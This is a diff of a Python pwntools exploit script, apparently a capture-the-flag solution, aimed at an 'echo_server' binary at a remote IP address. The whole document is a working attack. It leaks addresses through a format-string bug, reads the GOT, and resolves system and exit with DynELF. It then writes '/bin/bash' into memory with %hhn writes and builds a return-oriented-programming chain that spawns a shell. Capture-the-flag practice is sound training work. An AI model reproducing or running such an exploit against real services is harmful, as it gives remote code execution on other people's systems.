@@ -2,16 +2,30 @@
 from pwn import *
 
 def loc():
-    global elf, libc
+    global elf, libc, program_index, stack_index, input_index
     elf = ELF("./echo_server")
-    libc = elf.libc
+
+    # index that leaks a program address
+    program_index = 1
+    # index that leaks the proper stack address
+    stack_index = 141
+    # index at which we start seeing our own input on the stack
+    input_index = 6
+
     return process("./echo_server")
 
 def rem():
-    global elf, libc
+    global elf, libc, program_index, stack_index, input_index
     elf = ELF("./echo_server")
-    libc = ELF("./libc.so.6")
-    return remote("127.0.0.1", 10006)
+
+    # index that leaks a program address
+    program_index = 1
+    # index that leaks the proper stack address
+    stack_index = 141
+    # index at which we start seeing our own input on the stack
+    input_index = 6
+
+    return remote("174.138.113.205", 3004)
 
 def format_lx(i):
     return "%{}$lx".format(str(i).rjust(4, "0"))
@@ -37,48 +51,36 @@ def enumerate(start, end):
         r.send(input)
         print "%d: %s" % (i, r.recv(1024))
 
-# input_index is where the first 8 bytes of our input are
-def find_input_index():
-    global r
-
-    for i in range(20):
-        input = "A" * 8 + format_lx(i)
-        r.send(input)
-        output = r.recv(1024)
-        if "4141414141" in output:
-            return i
-
 r = rem()
 
 # # pause and attach with debugger to check rbp and program base address
 # pause()
+
 # # find an address that points to the stack and one that points to the program
 # enumerate(0, 500)
 # exit(0)
 
-# Argument 141 points to the program
-r.send(format_lx(146))
+r.send(format_lx(program_index))
 address = r.recv(1024)
 address = int(address, 16)
 program_base = address & 0xfffffffffffff000
 
-# Argument 145 points to the stack
-r.send(format_lx(141))
+r.send(format_lx(stack_index))
 address = r.recv(1024)
 address = int(address, 16)
 rbp = address - 0xf8
 
-# input_index = find_input_index()
-input_index = 6
-
 def read(address):
     address = p64(address)
+    separator = "A" * 8 + address[: address.index("\x00")]
+
     input = format_s(input_index + 2) + "A" * 8 + address
     r.send(input)
 
     output = r.recv(1024)
-    output = output[: - (len(input[: input.find("\x00")]) - 8)]
+    output = output[: output.find(separator)]
     output += "\x00"
+
     return output
 
 def write(address, value):
@@ -87,7 +89,7 @@ def write(address, value):
     if value > 0:
         input = format_data(20, value) + format_hhn(input_index + 3) + address
     else:
-        input = format_hhn(input_index + 3) * 3 + address
+        input = format_hhn(input_index + 1) + address
 
     r.send(input)
 
@@ -106,51 +108,50 @@ def write_bytes(address, string):
             print hex(byte)
             raise e
 
-printf_got = elf.got["printf"]
-printf_got = program_base + printf_got
+read_got = elf.got["read"]
+read_got = program_base + read_got
+
 bss = program_base + elf.bss()
 command_location = bss + 0x100
-pop_rdi_gadget = 0x993
+
+pop_rdi_gadget = 0x9a3
 pop_rdi_gadget = program_base + pop_rdi_gadget
-pop_rsi_r15_gadget = 0x991
-pop_rsi_r15_gadget = program_base + pop_rsi_r15_gadget
+ret_gadget = pop_rdi_gadget + 1
 
-printf_real_address = u64(read(printf_got).ljust(8, "\x00"))
-libc_base = printf_real_address - libc.symbols["printf"]
-system_real_address = libc_base + libc.symbols["system"]
-exit_real_address = libc_base + libc.symbols["exit"]
+address = read(read_got)
+address = address.ljust(8, "\x00")
+read_real_address = u64(address)
+
+d = DynELF(read, read_real_address)
+system_real_address = d.lookup("system")
+exit_real_address = d.lookup("exit")
 
 print ""
-print "libc file: %s" % libc.path
-print "system offset: %s" % hex(libc.symbols["system"])
-print ""
-print "libc:   %s" % hex(libc_base)
-print "printf: %s" % hex(printf_real_address)
+print "read: %s" % hex(read_real_address)
 print "system: %s" % hex(system_real_address)
+print "exit: %s" % hex(exit_real_address)
 print ""
 print "program base:    %s" % hex(program_base)
 print "bss: %s" % hex(bss)
 print "command location: %s" % hex(command_location)
 print "pop rdi: %s" % hex(pop_rdi_gadget)
-print "pop rsi: %s" % hex(pop_rsi_r15_gadget)
 print "rbp: %s" % hex(rbp)
 
 write_bytes(command_location, "/bin/bash")
 
 chain = [
-    # Set argument to our command
+    # Set argument to the address of our command
     p64(pop_rdi_gadget),
     p64(command_location),
-    # Realign stack to 16n + 8 (if you don't do this, system will crash)
-    p64(pop_rsi_r15_gadget),
-    p64(0),
-    p64(0),
-    # Call system
+    # Align stack address for Ubuntu 18.04
+    p64(ret_gadget),
+    # Return to system
     p64(system_real_address),
+
     # Set argument to 0
     p64(pop_rdi_gadget),
     p64(0),
-    # Call exit
+    # Return to exit
     p64(exit_real_address),
 ]
 
